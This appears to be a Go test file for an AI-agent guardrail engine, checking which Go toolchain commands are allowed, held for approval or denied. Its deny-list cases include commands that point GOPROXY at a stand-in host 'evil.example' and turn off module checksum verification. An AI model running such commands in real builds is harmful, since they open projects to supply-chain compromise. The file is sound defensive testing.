package engine

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/CtrlCarlitos/agent-guardrails/internal/policy"
)

func evalGo(t *testing.T, repoRoot, cwd, command string) *policy.Verdict {
	t.Helper()
	return checkBash(ToolCall{
		Tool:     "Bash",
		Command:  command,
		CWD:      cwd,
		RepoRoot: repoRoot,
	}, &policy.Policy{Waived: map[string]bool{}})
}

func writeGoModule(t *testing.T, root, module string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Join(root, "cmd", "tool"), 0o755); err != nil {
		t.Fatal(err)
	}
	contents := []byte("module " + module + "\n\ngo 1.24\n")
	if err := os.WriteFile(filepath.Join(root, "go.mod"), contents, 0o644); err != nil {
		t.Fatal(err)
	}
}

func requireGoVerdict(t *testing.T, verdict *policy.Verdict, decision policy.Decision, ruleID string) {
	t.Helper()
	if verdict == nil || verdict.Decision != decision || verdict.RuleID != ruleID {
		t.Fatalf("verdict = %+v, want %s/%s", verdict, decision, ruleID)
	}
}

func TestWindowsGoRemoteRunAsks(t *testing.T) {
	root := t.TempDir()
	writeGoModule(t, root, "example.com/local/project")

	commands := []string{
		"go run github.com/acme/tool/cmd",
		"go run github.com/acme/tool/cmd@latest",
		"go run -race github.com/acme/tool/cmd",
		"go run -p 2 -cover github.com/acme/tool/cmd",
		"go run -buildvcs github.com/acme/tool/cmd",
		"go -C . run github.com/acme/tool/cmd",
		"env -- go run github.com/acme/tool/cmd",
		"timeout 30s command go run github.com/acme/tool/cmd",
		"/usr/local/bin/go run github.com/acme/tool/cmd",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			requireGoVerdict(t, evalGo(t, root, root, command), policy.Ask, "P6.package-install")
		})
	}
}

func TestWindowsGoLocalDevelopmentAllows(t *testing.T) {
	root := t.TempDir()
	writeGoModule(t, root, "example.com/local/project")

	commands := []string{
		"go run .",
		"go run ./cmd/tool",
		"go run ../project/cmd/tool",
		"go run main.go",
		"go run net/http",
		"go run example.com/local/project/cmd/tool",
		"go run -p 2 -cover -buildvcs=false example.com/local/project/cmd/tool",
		"go run -buildvcs ./cmd/tool",
		"go test ./...",
		"go test -race ./...",
		"go generate ./...",
		"go build ./cmd/tool",
		"go vet ./...",
		"go mod tidy",
		"go mod download",
		"go mod verify",
		"go mod vendor",
		"go tool compile main.go",
		"go work sync",
		"go clean -cache",
		"go env GOPROXY",
		"go env -u GOPROXY",
		"go version",
		"go help run",
		"go run ./cmd/tool -toolexec=program-argument",
		"go test ./... -args -toolexec=test-binary-argument",
		"GOPROXY=direct; env -u GOPROXY go test ./...",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			if verdict := evalGo(t, root, root, command); verdict != nil {
				t.Fatalf("verdict = %+v, want allow", verdict)
			}
		})
	}
}

func TestWindowsGoUnknownRunFlagFailsClosed(t *testing.T) {
	root := t.TempDir()
	writeGoModule(t, root, "example.com/local/project")
	requireGoVerdict(t,
		evalGo(t, root, root, "go run -future-flag ./cmd/tool"),
		policy.Ask,
		"P6.package-install",
	)
}

func TestWindowsGoOwnModuleResolutionTracksWorkingDirectory(t *testing.T) {
	root := t.TempDir()
	writeGoModule(t, root, "example.com/local/project")
	subdir := filepath.Join(root, "cmd", "tool")

	allowed := []struct {
		name    string
		cwd     string
		command string
	}{
		{name: "nested cwd", cwd: subdir, command: "go run example.com/local/project/cmd/tool"},
		{name: "shell cd", cwd: root, command: "cd cmd/tool && go run example.com/local/project/cmd/tool"},
		{name: "go C", cwd: root, command: "go -C cmd/tool run example.com/local/project/cmd/tool"},
	}
	for _, test := range allowed {
		t.Run(test.name, func(t *testing.T) {
			if verdict := evalGo(t, root, test.cwd, test.command); verdict != nil {
				t.Fatalf("verdict = %+v, want allow", verdict)
			}
		})
	}

	requireGoVerdict(t,
		evalGo(t, root, subdir, "go run example.net/external/tool"),
		policy.Ask,
		"P6.package-install",
	)
}

func TestWindowsGoRegistryRedirectDenies(t *testing.T) {
	root := t.TempDir()
	writeGoModule(t, root, "example.com/local/project")

	commands := []string{
		"GOPROXY=https://evil.example go test ./...",
		"env GOINSECURE='*' go build ./...",
		"env -- GONOSUMDB='*' go list ./...",
		"GONOSUMCHECK='*'; go vet ./...",
		"GOFLAGS=-insecure go test ./...",
		"go env -w GOPROXY=https://evil.example",
		"go env -w GOINSECURE='*' GONOSUMDB='*'",
		"go env -w GOFLAGS=-insecure",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			requireGoVerdict(t, evalGo(t, root, root, command), policy.Deny, "P6.registry-redirect")
		})
	}

	if verdict := evalGo(t, root, root, "GOPROXY=direct printf ok"); verdict != nil {
		t.Fatalf("non-Go command verdict = %+v, want allow", verdict)
	}
}

func TestWindowsGoUnknownEnvironmentFailsClosed(t *testing.T) {
	root := t.TempDir()
	writeGoModule(t, root, "example.com/local/project")

	commands := []string{
		`GOPROXY="$RUNTIME_PROXY"; go test ./...`,
		`env GOPROXY="$RUNTIME_PROXY" go test ./...`,
		"export GOPROXY=direct; go test ./...",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			requireGoVerdict(t, evalGo(t, root, root, command), policy.Ask, "P3.unresolved")
		})
	}
}

func TestWindowsGoToolExecAsks(t *testing.T) {
	root := t.TempDir()
	writeGoModule(t, root, "example.com/local/project")

	commands := []string{
		"go build -toolexec ./wrapper ./...",
		"go run -toolexec=./wrapper ./cmd/tool",
		"go test -toolexec ./wrapper ./...",
		"go vet -toolexec=./wrapper ./...",
		"GOFLAGS='-toolexec=./wrapper' go test ./...",
		"go env -w GOFLAGS=-toolexec=./wrapper",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			requireGoVerdict(t, evalGo(t, root, root, command), policy.Ask, "P1.toolexec")
		})
	}
}

func TestWindowsGoModEditAsks(t *testing.T) {
	root := t.TempDir()
	writeGoModule(t, root, "example.com/local/project")

	commands := []string{
		"go mod edit -go=1.25",
		"go -C . mod edit -replace example.com/old=../new",
		"env go mod edit -droprequire example.com/old",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			requireGoVerdict(t, evalGo(t, root, root, command), policy.Ask, "P5.ci-infra-lockfile")
		})
	}
}

func TestWindowsGoPackageInstallClassificationHandlesFlagsAndWrappers(t *testing.T) {
	root := t.TempDir()
	writeGoModule(t, root, "example.com/local/project")

	commands := []string{
		"go get example.com/dependency",
		"go get -u example.com/dependency",
		"go install example.com/tool@latest",
		"go -C . install example.com/tool@latest",
		"env go get example.com/dependency",
		"command go install example.com/tool@latest",
	}
	for _, command := range commands {
		t.Run(command, func(t *testing.T) {
			requireGoVerdict(t, evalGo(t, root, root, command), policy.Ask, "P6.package-install")
		})
	}
}
